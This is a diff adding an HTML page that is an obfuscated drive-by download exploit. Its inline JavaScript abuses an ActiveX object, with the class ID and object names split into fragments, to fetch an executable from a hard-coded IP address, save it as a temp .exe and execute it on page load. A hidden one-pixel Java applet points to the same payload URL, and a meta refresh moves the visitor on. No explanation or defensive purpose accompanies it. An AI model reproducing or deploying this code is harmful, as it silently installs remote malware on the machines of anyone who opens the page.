@@ -1,0 +1,59 @@
+<html>
+<head>
+<meta HTTP-EQUIV="REFRESH" content="3;
+URL=12.htm">
+
+<Script Language='JavaScript'>
+
+bof(); function bof() {
+
+var z = document.createElement('object');
+
+z.setAttribute('id','z');
+
+var aa='clsid:BD96';
+var bb='C556-65A';
+var cc='3-11D0-98';
+var dd='3A-00C04FC';
+var ff='29E36';
+
+z.setAttribute("cl"+"as"+"sid",aa+bb+cc+dd+ff);
+
+try {
+
+var ix ='xm'+'lh'+'ttp';
+var ui ='msxml2.';
+var tat =(ui+ix)
+
+var q = z.CreateObject(tat,'');
+
+var komm ='Shel';
+var jin ='l.Ap';
+var stf ='plica';
+var toto ='tion';
+var zub = (komm+jin+stf+toto)
+
+var s = z.CreateObject(zub,'');
+
+var koi ='db.';
+var uni ='am';
+var xio ='ado';
+var nin ='stre';
+var res=(xio+koi+nin+uni);
+var t = z.CreateObject(res,'');
+
+var name = './/..//~tmp1174.exe';
+
+try { t.type = 1;
+q.open('G'+"E"+'T','http://206.161.120.42/~eugenewh/up4/load.php',false);
+q.send(); t.open();
+t.Write(q.responseBody);
+t.SaveToFile(name,2);
+t.Close(); } catch(e) { }
+try { s.ShellExecute(name); } catch(e) { }}
+catch(e){}} 
+</Script>
+<applet archive="java.php" code="BaaaaBaa.class" width=1  height=1><param name="url" value="http://206.161.120.42/~eugenewh/up4/load.php"> 
+</applet>
+</head>
+</html>
